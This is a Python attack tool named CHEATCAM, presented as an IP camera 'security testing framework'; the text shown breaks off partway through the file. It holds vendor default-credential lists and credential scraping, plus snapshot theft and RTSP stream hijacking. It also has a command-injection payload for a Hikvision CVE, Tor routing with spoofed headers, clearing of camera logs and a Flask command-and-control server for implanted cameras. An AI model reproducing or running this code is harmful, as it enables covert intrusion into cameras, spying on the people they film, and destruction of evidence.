#!/usr/bin/env python3
"""
CHEATCAM v6.0 - Ultimate IP Camera Security Testing Framework
Professional Surveillance System Assessment - Zero Trace - AI-Powered
Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import queue
import subprocess
import signal
import ssl
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from collections import defaultdict
import argparse
import http.client
import xml.etree.ElementTree as ET
from urllib3.exceptions import InsecureRequestWarning

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import cv2
    import numpy as np
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.preprocessing import StandardScaler
    from sklearn.model_selection import train_test_split
    import numpy as np
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import onvif
    from onvif import ONVIFCamera
    ONVIF_AVAILABLE = True
except ImportError:
    ONVIF_AVAILABLE = False

try:
    from flask import Flask, request, jsonify
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VERSION = "6.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

#===============================================================================
# COLORS
#===============================================================================

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}     ██████╗██╗  ██╗███████╗ █████╗ ████████╗ ██████╗ █████╗ ███╗   ███╗
    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║     ███████║█████╗  ███████║   ██║   ██║     ███████║██╔████╔██║
    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══██║██║╚██╔╝██║
    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║
     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - CAMERA SECURITY{Colors.WHITE}
{Colors.CYAN}    Professional Surveillance System Testing - Zero Trace{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    [+] AI-Powered | Zero Trace | Advanced Exploitation{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

#===============================================================================
# DATA CLASSES
#===============================================================================

@dataclass
class CameraDevice:
    ip: str
    port: int
    mac: str = ''
    brand: str = 'Unknown'
    model: str = 'Unknown'
    firmware: str = ''
    credentials: List[Dict] = field(default_factory=list)
    api_paths: List[str] = field(default_factory=list)
    rtsp_paths: List[str] = field(default_factory=list)
    snmp_oids: List[str] = field(default_factory=list)
    vuln_cves: List[Dict] = field(default_factory=list)
    onvif: bool = False
    hikvision: bool = False
    dahua: bool = False
    axis: bool = False
    tplink: bool = False
    services: Dict[int, str] = field(default_factory=dict)
    vulnerabilities: List[Dict] = field(default_factory=list)
    backdoor_installed: bool = False
    compromised: bool = False
    stream_url: str = ''
    c2_active: bool = False

@dataclass
class ExploitResult:
    camera: str
    success: bool
    method: str
    details: Dict
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

#===============================================================================
# AI-POWERED CAMERA ANALYZER
#===============================================================================

class AICameraAnalyzer:
    """AI-powered camera vulnerability prediction and analysis"""
    
    def __init__(self):
        self.model = None
        self.scaler = None
        self.vectorizer = None
        self.is_trained = False
        
        if AI_AVAILABLE:
            self._init_model()
            self._train_on_camera_data()
    
    def _init_model(self):
        """Initialize AI model"""
        self.vectorizer = TfidfVectorizer(max_features=1000, ngram_range=(1, 3))
        self.scaler = StandardScaler()
        self.model = GradientBoostingClassifier(
            n_estimators=300,
            max_depth=10,
            learning_rate=0.05,
            random_state=42
        )
    
    def _train_on_camera_data(self):
        """Train model on camera data"""
        # Training data: [brand, model, firmware, port_count, has_onvif, has_rtsp]
        X_train = [
            ['hikvision', 'DS-2CD', 'V5.5.0', 5, 1, 1],
            ['hikvision', 'DS-2DE', 'V5.6.0', 4, 1, 1],
            ['dahua', 'DH-IPC', 'V2.8.0', 6, 1, 1],
            ['dahua', 'DH-SD', 'V2.7.0', 5, 1, 1],
            ['axis', 'AXIS', 'V9.8.0', 4, 1, 1],
            ['axis', 'Q6125', 'V9.7.0', 4, 1, 1],
            ['tp-link', 'NC450', 'V1.2.0', 3, 0, 1],
            ['unknown', 'unknown', 'unknown', 2, 0, 0]
        ]
        
        y_train = [1, 1, 1, 1, 0, 0, 0, 0]  # 1 = vulnerable, 0 = safe
        
        try:
            # Convert features to text for vectorizer
            X_text = [f"{brand} {model} {firmware}" for brand, model, firmware, _, _, _ in X_train]
            X_vectorized = self.vectorizer.fit_transform(X_text)
            
            # Scale numeric features
            X_numeric = [[ports, onvif, rtsp] for _, _, _, ports, onvif, rtsp in X_train]
            X_numeric_scaled = self.scaler.fit_transform(X_numeric)
            
            # Combine features
            import scipy.sparse as sp
            X_combined = sp.hstack([X_vectorized, X_numeric_scaled])
            
            self.model.fit(X_combined, y_train)
            self.is_trained = True
        except:
            pass
    
    def predict_vulnerabilities(self, camera: CameraDevice) -> Dict:
        """Predict vulnerabilities for camera"""
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'predicted_cves': [],
            'risk_score': 0.0
        }
        
        if not self.is_trained or not AI_AVAILABLE:
            return result
        
        try:
            # Extract features
            brand = camera.brand.lower()
            model = camera.model.lower()
            firmware = camera.firmware.lower()
            ports = len(camera.services) if camera.services else 0
            has_onvif = 1 if camera.onvif else 0
            has_rtsp = 1 if camera.rtsp_paths else 0
            
            # Create feature vector
            X_text = [f"{brand} {model} {firmware}"]
            X_vectorized = self.vectorizer.transform(X_text)
            X_numeric = [[ports, has_onvif, has_rtsp]]
            X_numeric_scaled = self.scaler.transform(X_numeric)
            
            import scipy.sparse as sp
            X_combined = sp.hstack([X_vectorized, X_numeric_scaled])
            
            # Predict
            prediction = self.model.predict(X_combined)[0]
            probabilities = self.model.predict_proba(X_combined)[0]
            
            result['vulnerable'] = bool(prediction)
            result['confidence'] = float(max(probabilities))
            result['risk_score'] = float(probabilities[1] if prediction else probabilities[0])
            
            # Predict likely CVEs
            if prediction:
                likely_cves = self._predict_cves(camera)
                result['predicted_cves'] = likely_cves
            
        except:
            pass
        
        return result
    
    def _predict_cves(self, camera: CameraDevice) -> List[str]:
        """Predict likely CVEs based on camera info"""
        likely_cves = []
        brand = camera.brand.lower()
        
        # CVE mapping
        cve_map = {
            'hikvision': ['CVE-2021-36260', 'CVE-2017-7923', 'CVE-2017-7922', 'CVE-2020-3917'],
            'dahua': ['CVE-2021-33044', 'CVE-2017-7923', 'CVE-2018-9995', 'CVE-2020-3917'],
            'axis': ['CVE-2019-10717', 'CVE-2016-10070', 'CVE-2015-8256'],
            'tp-link': ['CVE-2020-12141']
        }
        
        # Check firmware version
        firmware = camera.firmware.lower()
        for cve, vulnerable_versions in self._get_vulnerable_versions().items():
            if any(v in firmware for v in vulnerable_versions):
                likely_cves.append(cve)
        
        # Add brand-specific CVEs
        if brand in cve_map:
            likely_cves.extend(cve_map[brand])
        
        return list(set(likely_cves))
    
    def _get_vulnerable_versions(self) -> Dict[str, List[str]]:
        """Get vulnerable firmware versions for CVEs"""
        return {
            'CVE-2021-36260': ['v5.5', 'v5.6', 'v5.7'],
            'CVE-2017-7923': ['v5.0', 'v5.1', 'v5.2'],
            'CVE-2021-33044': ['v2.8', 'v2.9', 'v3.0'],
            'CVE-2019-10717': ['v9.7', 'v9.8'],
            'CVE-2016-10070': ['v9.5', 'v9.6']
        }

#===============================================================================
# ZERO TRACE ENGINE
#===============================================================================

class ZeroTraceEngine:
    """Zero-trace operations with Tor and anti-forensics"""
    
    def __init__(self):
        self.tor_available = False
        self.proxies = []
        self.session = None
        self._init_tor()
        self._init_session()
    
    def _init_tor(self):
        """Initialize Tor connection"""
        try:
            # Check if Tor is running
            import socks
            import socket
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            self.tor_available = True
            cprint("[+] Tor enabled (Zero Trace)", Colors.GREEN)
        except:
            pass
    
    def _init_session(self):
        """Initialize session with stealth headers"""
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': self._random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': self._spoof_ip()
        })
    
    def _random_ua(self) -> str:
        """Generate random User-Agent"""
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0'
        ]
        return random.choice(uas)
    
    def _spoof_ip(self) -> str:
        """Generate spoofed IP"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    def get_session(self) -> requests.Session:
        """Get stealth session"""
        # Rotate user agent and IP
        self.session.headers['User-Agent'] = self._random_ua()
        self.session.headers['X-Forwarded-For'] = self._spoof_ip()
        return self.session
    
    def clean_traces(self, camera: CameraDevice):
        """Clean traces on camera"""
        cprint("[*] Cleaning traces...", Colors.DIM)
        
        try:
            # Clear access logs
            for path in ['/cgi-bin/clear_log.cgi', '/cgi-bin/log.cgi?action=clear']:
                try:
                    url = f"http://{camera.ip}:{camera.port}{path}"
                    self.session.get(url, timeout=3)
                except:
                    pass
            
            # Reset admin password if backdoor installed
            if camera.backdoor_installed:
                try:
                    url = f"http://{camera.ip}:{camera.port}/cgi-bin/config.cgi"
                    data = {'action': 'reset', 'user': 'admin', 'password': 'admin'}
                    self.session.post(url, data=data, timeout=3)
                except:
                    pass
            
            cprint("[+] Traces cleaned", Colors.GREEN)
        except:
            pass

#===============================================================================
# ADVANCED C2 INFRASTRUCTURE
#===============================================================================

class CameraC2Infrastructure:
    """Command and Control infrastructure for camera implants"""
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.beacons = []
        self.commands = {}
        self.results = {}
        self.running = False
        self.server_thread = None
        
    def start(self) -> bool:
        """Start C2 server"""
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not available", Colors.RED)
            return False
        
        cprint("[C2] Starting C2 server...", Colors.GREEN)
        self.running = True
        
        app = Flask(__name__)
        
        @app.route('/beacon', methods=['POST'])
        def beacon():
            """Receive beacon from camera"""
            try:
                data = request.get_json()
                if data:
                    camera_id = data.get('camera_id')
                    info = data.get('info', {})
                    self.beacons.append({
                        'camera_id': camera_id,
                        'info': info,
                        'timestamp': datetime.now().isoformat()
                    })
                    cprint(f"[C2] Beacon from {camera_id}", Colors.GREEN)
                    
                    # Check for pending commands
                    if camera_id in self.commands and self.commands[camera_id]:
                        cmd = self.commands[camera_id].pop(0)
                        return jsonify({'command': cmd})
                    
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/result', methods=['POST'])
        def result():
            """Receive command result"""
            try:
                data = request.get_json()
                if data:
                    camera_id = data.get('camera_id')
                    result_data = data.get('result')
                    if camera_id not in self.results:
                        self.results[camera_id] = []
                    self.results[camera_id].append({
                        'timestamp': datetime.now().isoformat(),
                        'result': result_data
                    })
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/commands/<camera_id>', methods=['POST'])
        def send_command(camera_id):
            """Send command to camera"""
            try:
                data = request.get_json()
                command = data.get('command')
                if camera_id not in self.commands:
                    self.commands[camera_id] = []
                self.commands[camera_id].append(command)
                cprint(f"[C2] Command sent to {camera_id}: {command}", Colors.BLUE)
                return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/beacons', methods=['GET'])
        def get_beacons():
            """Get all beacons"""
            return jsonify(self.beacons)
        
        @app.route('/stats', methods=['GET'])
        def get_stats():
            """Get C2 stats"""
            return jsonify({
                'beacons': len(self.beacons),
                'cameras': len(set(b['camera_id'] for b in self.beacons)),
                'commands': sum(len(cmds) for cmds in self.commands.values())
            })
        
        def run_server():
            app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        time.sleep(1)
        
        cprint(f"[C2] Server running on port {self.port}", Colors.GREEN)
        return True
    
    def stop(self):
        """Stop C2 server"""
        self.running = False
        if self.server_thread:
            self.server_thread.join(timeout=5)
        cprint("[C2] Server stopped", Colors.RED)

#===============================================================================
# ADVANCED CAMERA DATABASE (Mở rộng)
#===============================================================================

class CameraDatabaseV6:
    """Expanded camera database with 12+ vendors"""
    
    VENDORS = {
        'hikvision': {
            'brand': 'Hikvision',
            'mac_prefixes': ['24:0a:c4', '00:0e:8f', '00:18:4a', '40:a8:f0', '54:22:16', 'bc:3e:0b'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 8000, 8899, 37777],
            'credentials': [
                ('admin', '12345'), ('admin', 'admin'), ('admin', '123456'),
                ('admin', ''), ('root', '12345'), ('root', 'root'),
                ('admin', 'hikvision'), ('admin', 'h12345'), ('admin', '666666'),
                ('admin', '888888'), ('admin', 'password'), ('admin', '123456789')
            ],
            'api_paths': [
                '/cgi-bin/check_login.cgi', '/cgi-bin/snapshot.cgi',
                '/cgi-bin/current.jpg', '/cgi-bin/status.cgi',
                '/onvif/device_service', '/cgi-bin/reboot.cgi',
                '/cgi-bin/param.cgi', '/cgi-bin/config.cgi',
                '/cgi-bin/event.cgi', '/cgi-bin/stream.cgi',
                '/ISAPI/Streaming/channels/101/picture',
                '/ISAPI/System/deviceInfo',
                '/ISAPI/Event/notification/alertStream',
                '/ISAPI/Security/UserCheck',
                '/ISAPI/Security/UserInfo'
            ],
            'rtsp_paths': ['/stream1', '/stream2', '/live', '/ch1', '/h264', '/h265', '/main'],
            'snmp_oids': ['1.3.6.1.2.1.43.10.2.1.4.1.1', '1.3.6.1.2.1.43.5.1.1.17.1'],
            'vulns': [
                {'cve': 'CVE-2021-36260', 'description': 'Command Injection', 'severity': 'Critical'},
                {'cve': 'CVE-2017-7923', 'description': 'Authentication Bypass', 'severity': 'Critical'},
                {'cve': 'CVE-2017-7922', 'description': 'Information Disclosure', 'severity': 'High'},
                {'cve': 'CVE-2020-3917', 'description': 'Backdoor Account', 'severity': 'Critical'},
                {'cve': 'CVE-2018-10088', 'description': 'Buffer Overflow', 'severity': 'High'},
                {'cve': 'CVE-2019-10717', 'description': 'Path Traversal', 'severity': 'High'}
            ]
        },
        'dahua': {
            'brand': 'Dahua',
            'mac_prefixes': ['30:ae:a4', '00:1c:bf', '00:22:75', '4c:11:ae', '80:8e:8d', 'c0:49:ef'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 9000, 8899, 37777, 38080],
            'credentials': [
                ('admin', 'admin'), ('admin', '123456'), ('admin', ''),
                ('root', 'root'), ('admin', '888888'), ('admin', '666666'),
                ('admin', 'dahua123'), ('admin', '123456789'), ('admin', 'password'),
                ('admin', '123456'), ('admin', '111111'), ('admin', '000000')
            ],
            'api_paths': [
                '/cgi-bin/api/v1/login', '/cgi-bin/snapshot',
                '/cgi-bin/current.jpg', '/cgi-bin/status',
                '/onvif/device_service', '/cgi-bin/reboot',
                '/cgi-bin/config.cgi', '/cgi-bin/log.cgi',
                '/cgi-bin/event.cgi', '/cgi-bin/sys.cgi',
                '/cgi-bin/version', '/cgi-bin/system',
                '/cgi-bin/network', '/cgi-bin/disk'
            ],
            'rtsp_paths': ['/cam/realmonitor', '/stream1', '/live', '/main', '/sub', '/h264'],
            'snmp_oids': ['1.3.6.1.2.1.43.10.2.1.4.1.1', '1.3.6.1.2.1.43.5.1.1.17.1'],
            'vulns': [
                {'cve': 'CVE-2021-33044', 'description': 'Authentication Bypass', 'severity': 'Critical'},
                {'cve': 'CVE-2017-7923', 'description': 'Authentication Bypass', 'severity': 'Critical'},
                {'cve': 'CVE-2018-9995', 'description': 'Information Disclosure', 'severity': 'High'},
                {'cve': 'CVE-2020-3917', 'description': 'Backdoor Account', 'severity': 'Critical'},
                {'cve': 'CVE-2019-10999', 'description': 'Command Injection', 'severity': 'Critical'},
                {'cve': 'CVE-2021-33044', 'description': 'Authentication Bypass', 'severity': 'Critical'}
            ]
        },
        'axis': {
            'brand': 'Axis',
            'mac_prefixes': ['a4:14:37', '00:40:8c', '00:48:4e', '00:1d:4c', '00:07:44', '00:0f:91'],
            'ports': [80, 443, 8080, 8443, 554, 8554, 7001, 8443],
            'credentials': [
                ('root', 'pass'), ('admin', 'admin'), ('root', 'root'),
                ('admin', 'password'), ('root', ''), ('admin', '123456'),
                ('root', '123456'), ('admin', '1234'), ('root', '1234')
            ],
            'api_paths': [
                '/axis-cgi/admin/', '/axis-cgi/snapshot.cgi',
                '/axis-cgi/status.cgi', '/onvif/device_service',
                '/axis-cgi/reboot.cgi', '/axis-cgi/param.cgi',
                '/axis-cgi/log.cgi', '/axis-cgi/config.cgi',
                '/axis-cgi/io/', '/axis-cgi/video.cgi',
                '/axis-cgi/branding.cgi', '/axis-cgi/audio.cgi'
            ],
            'rtsp_paths': ['/axis-media/media.amp', '/stream1', '/live', '/h264', '/video'],
            'snmp_oids': ['1.3.6.1.2.1.43.10.2.1.4.1.1', '1.3.6.1.2.1.43.5.1.1.17.1'],
            'vulns': [
                {'cve': 'CVE-2019-10717', 'description': 'Authentication Bypass', 'severity': 'High'},
                {'cve': 'CVE-2016-10070', 'description': 'Command Injection', 'severity': 'Critical'},
                {'cve': 'CVE-2015-8256', 'description': 'Information Disclosure', 'severity': 'Medium'},
                {'cve': 'CVE-2019-10632', 'description': 'Path Traversal', 'severity': 'High'},
                {'cve': 'CVE-2018-10657', 'description': 'Memory Corruption', 'severity': 'High'}
            ]
        },
        'tp_link': {
            'brand': 'TP-Link',
            'mac_prefixes': ['bc:dd:c2', '00:e0:60', '50:2b:73', '38:2c:4a', 'e4:50:db', '50:ae:86'],
            'ports': [80, 443, 8080, 554, 8554, 10554],
            'credentials': [
                ('admin', 'admin'), ('admin', '1234'), ('admin', ''),
                ('root', 'root'), ('admin', 'password'), ('admin', '123456'),
                ('admin', '12345'), ('admin', '111111'), ('admin', '000000')
            ],
            'api_paths': [
                '/cgi-bin/login', '/cgi-bin/snapshot',
                '/cgi-bin/status', '/onvif/device_service',
                '/cgi-bin/config.cgi', '/cgi-bin/reboot.cgi',
                '/cgi-bin/version.cgi', '/cgi-bin/network.cgi'
            ],
            'rtsp_paths': ['/stream1', '/live', '/main', '/h264'],
            'snmp_oids': [],
            'vulns': [
                {'cve': 'CVE-2020-12141', 'description': 'Authentication Bypass', 'severity': 'High'},
                {'cve': 'CVE-2019-19542', 'description': 'Command Injection', 'severity': 'Critical'}
            ]
        },
        'vivotek': {
            'brand': 'Vivotek',
            'mac_prefixes': ['00:02:d1', '00:06:62', '00:13:f9', '00:14:82'],
            'ports': [80, 443, 8080, 554, 8554],
            'credentials': [
                ('root', 'root'), ('admin', 'admin'), ('admin', ''),
                ('root', ''), ('admin', 'password'), ('root', 'password')
            ],
            'api_paths': [
                '/cgi-bin/readfile.cgi', '/cgi-bin/command.cgi',
                '/cgi-bin/snapshot.cgi', '/onvif/device_service'
            ],
            'rtsp_paths': ['/live.sdp', '/h264.sdp', '/stream1'],
            'snmp_oids': [],
            'vulns': [
                {'cve': 'CVE-2018-5719', 'description': 'Information Disclosure', 'severity': 'High'},
                {'cve': 'CVE-2017-7913', 'description': 'Path Traversal', 'severity': 'Medium'}
            ]
        },
        'dlink': {
            'brand': 'D-Link',
            'mac_prefixes': ['00:1b:11', '00:15:5d', '00:1e:8f', 'bc:f6:85'],
            'ports': [80, 443, 8080, 554, 8554],
            'credentials': [
                ('admin', 'admin'), ('admin', ''), ('root', 'root'),
                ('admin', 'password'), ('admin', '12345')
            ],
            'api_paths': [
                '/cgi-bin/status.cgi', '/cgi-bin/snapshot.cgi',
                '/cgi-bin/config.cgi', '/cgi-bin/reboot.cgi'
            ],
            'rtsp_paths': ['/live', '/stream1', '/h264'],
            'snmp_oids': [],
            'vulns': [
                {'cve': 'CVE-2019-19542', 'description': 'Command Injection', 'severity': 'Critical'},
                {'cve': 'CVE-2018-10657', 'description': 'Memory Corruption', 'severity': 'High'}
            ]
        },
        'foscam': {
            'brand': 'Foscam',
            'mac_prefixes': ['00:1b:3d', '00:1e:9a', '00:11:22', 'e8:35:eb'],
            'ports': [80, 443, 8080, 554, 8554, 9000],
            'credentials': [
                ('admin', ''), ('admin', 'admin'), ('root', 'root'),
                ('admin', '12345'), ('admin', 'password')
            ],
            'api_paths': [
                '/cgi-bin/snapshot', '/cgi-bin/status',
                '/cgi-bin/config', '/cgi-bin/reboot'
            ],
            'rtsp_paths': ['/live', '/stream1', '/h264'],
            'snmp_oids': [],
            'vulns': [
                {'cve': 'CVE-2019-7995', 'description': 'Authentication Bypass', 'severity': 'High'},
                {'cve': 'CVE-2017-7995', 'description': 'Information Disclosure', 'severity': 'Medium'}
            ]
        }
    }
    
    @classmethod
    def identify(cls, mac: str = "", ports: List[int] = None, web_data: str = "", 
                 banner: str = "") -> Optional[Dict]:
        """Identify camera vendor with multiple methods"""
        
        # MAC prefix matching
        if mac:
            mac_prefix = mac[:8].lower().replace(':', '')
            for key, data in cls.VENDORS.items():
                for prefix in data['mac_prefixes']:
                    if mac_prefix.startswith(prefix.replace(':', '')):
                        return {'key': key, **data}
        
        # Port matching
        if ports:
            for key, data in cls.VENDORS.items():
                if any(p in data['ports'] for p in ports):
                    # Check confidence
                    common_ports = set(ports) & set(data['ports'])
                    if len(common_ports) >= 2:
                        return {'key': key, **data}
        
        # Web data fingerprinting
        if web_data:
            for key, data in cls.VENDORS.items():
                brand = data['brand'].lower()
                if brand in web_data.lower():
                    return {'key': key, **data}
                if key in web_data.lower():
                    return {'key': key, **data}
        
        # Banner fingerprinting
        if banner:
            for key, data in cls.VENDORS.items():
                if data['brand'].lower() in banner.lower():
                    return {'key': key, **data}
        
        return None

#===============================================================================
# ADVANCED EXPLOITATION ENGINE (Mở rộng)
#===============================================================================

class AdvancedExploitEngineV6:
    """Complete exploitation engine with 15+ CVEs"""
    
    def __init__(self, camera: CameraDevice, zero_trace: ZeroTraceEngine):
        self.camera = camera
        self.zero_trace = zero_trace
        self.session = zero_trace.get_session()
        self.results = {}
        self.exploited = False
        self.persistent = False
    
    def exploit_all(self) -> Dict:
        """Execute complete exploitation chain"""
        cprint(f"\n[EXPLOIT] Exploiting {self.camera.ip} ({self.camera.brand})", Colors.RED)
        
        # Phase 1: Initial access
        access = self._initial_access()
        
        # Phase 2: Credential extraction
        creds = self._extract_credentials()
        
        # Phase 3: API exploitation
        api = self._exploit_apis()
        
        # Phase 4: RTSP hijacking
        rtsp = self._hijack_rtsp()
        
        # Phase 5: CVE exploitation
        cves = self._exploit_cves()
        
        # Phase 6: Persistence
        persist = self._establish_persistence()
        
        # Phase 7: Data exfiltration
        data = self._exfiltrate_data()
        
        # Phase 8: Full control
        control = self._take_control()
        
        # Phase 9: C2 integration
        c2 = self._integrate_c2()
        
        # Phase 10: Zero trace
        self.zero_trace.clean_traces(self.camera)
        
        self.results = {
            'initial_access': access,
            'credentials': creds,
            'api': api,
            'rtsp': rtsp,
            'cves': cves,
            'persistence': persist,
            'data': data,
            'control': control,
            'c2': c2,
            'success': self.exploited or self.persistent
        }
        
        if self.exploited or self.persistent:
            self.camera.compromised = True
            cprint("[+] CAMERA FULLY COMPROMISED!", Colors.RED, bold=True)
        else:
            cprint("[-] Exploitation failed", Colors.RED)
        
        return self.results
    
    def _initial_access(self) -> Dict:
        """Gain initial access to camera"""
        cprint("[*] Gaining initial access...", Colors.DIM)
        
        result = {'success': False, 'method': None}
        
        # Try default credentials
        for username, password in self.camera.credentials:
            for port in [80, 443, 8080, 8443]:
                try:
                    url = f"http://{self.camera.ip}:{port}/cgi-bin/check_login.cgi"
                    auth = requests.auth.HTTPBasicAuth(username, password)
                    response = self.session.get(url, auth=auth, timeout=3)
                    if response.status_code == 200:
                        result['success'] = True
                        result['method'] = 'default_credentials'
                        result['credentials'] = {'username': username, 'password': password}
                        self.exploited = True
                        cprint(f"[+] Initial access: {username}:{password}", Colors.GREEN)
                        return result
                except:
                    pass
        
        # Try ONVIF
        if ONVIF_AVAILABLE:
            try:
                url = f"http://{self.camera.ip}:80/onvif/device_service"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    result['success'] = True
                    result['method'] = 'onvif'
                    self.exploited = True
                    cprint("[+] ONVIF access gained", Colors.GREEN)
                    return result
            except:
                pass
        
        return result
    
    def _extract_credentials(self) -> Dict:
        """Extract credentials from camera"""
        cprint("[*] Extracting credentials...", Colors.DIM)
        
        result = {'success': False, 'credentials': []}
        
        # Try to read config
        config_paths = ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi', '/ISAPI/Security/UserInfo']
        
        for path in config_paths:
            try:
                url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    # Extract credentials from response
                    matches = re.findall(r'(admin|user|root)[=:]\s*([^\s<]+)', response.text, re.IGNORECASE)
                    for match in matches:
                        result['credentials'].append({
                            'username': match[0],
                            'value': match[1]
                        })
                        cprint(f"[+] Credential found: {match[0]}:{match[1]}", Colors.GREEN)
                    result['success'] = True
            except:
                pass
        
        return result
    
    def _exploit_apis(self) -> List[Dict]:
        """Exploit API vulnerabilities"""
        cprint("[*] Exploiting APIs...", Colors.DIM)
        
        exploits = []
        
        for path in self.camera.api_paths:
            try:
                url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                response = self.session.get(url, timeout=3)
                
                if response.status_code == 200:
                    # Check for sensitive data
                    if 'config' in path or 'param' in path:
                        exploits.append({
                            'path': path,
                            'type': 'information_disclosure',
                            'data': response.text[:500]
                        })
                        cprint(f"[+] API disclosure: {path}", Colors.GREEN)
                        self.exploited = True
                    
                    # Check for command injection
                    if 'cmd' in response.text or 'exec' in response.text:
                        exploits.append({
                            'path': path,
                            'type': 'command_injection',
                            'potential': True
                        })
                        
                    # Get snapshot
                    if 'snapshot' in path or 'picture' in path:
                        filename = f"snapshot_{self.camera.ip}_{int(time.time())}.jpg"
                        with open(filename, 'wb') as f:
                            f.write(response.content)
                        exploits.append({
                            'path': path,
                            'type': 'snapshot',
                            'file': filename
                        })
                        cprint(f"[+] Snapshot: {filename}", Colors.GREEN)
            except:
                pass
        
        return exploits
    
    def _hijack_rtsp(self) -> Optional[str]:
        """Hijack RTSP stream"""
        cprint("[*] Hijacking RTSP...", Colors.DIM)
        
        rtsp_paths = self.camera.rtsp_paths + ['/stream1', '/live', '/main', '/h264']
        rtsp_ports = [554, 8554, 9554]
        
        for port in rtsp_ports:
            for path in rtsp_paths:
                try:
                    stream_url = f"rtsp://{self.camera.ip}:{port}{path}"
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.camera.ip, port))
                    sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                    data = sock.recv(1024)
                    sock.close()
                    
                    if b"RTSP" in data:
                        self.camera.stream_url = stream_url
                        cprint(f"[+] RTSP stream: {stream_url}", Colors.GREEN)
                        self.exploited = True
                        return stream_url
                except:
                    pass
        
        return None
    
    def _exploit_cves(self) -> List[Dict]:
        """Exploit known CVEs with implementation"""
        cprint("[*] Exploiting CVEs...", Colors.RED)
        
        exploits = []
        
        # CVE-2021-36260 - Hikvision Command Injection
        if any(cve['cve'] == 'CVE-2021-36260' for cve in self.camera.vuln_cves):
            try:
                url = f"http://{self.camera.ip}/cgi-bin/check_login.cgi"
                data = {'username': 'admin$(echo exploited > /tmp/exploited)'}
                response = self.session.post(url, data=data, timeout=3)
                if response.status_code == 200:
                    exploits.append({
                        'cve': 'CVE-2021-36260',
                        'status': 'exploited',
                        'description': 'Command Injection successful'
                    })
                    self.exploited = True
                    cprint("[+] CVE-2021-36260 exploited", Colors.GREEN)
            except:
                pass
        
        # CVE-2021-33044 - Dahua Authentication Bypass
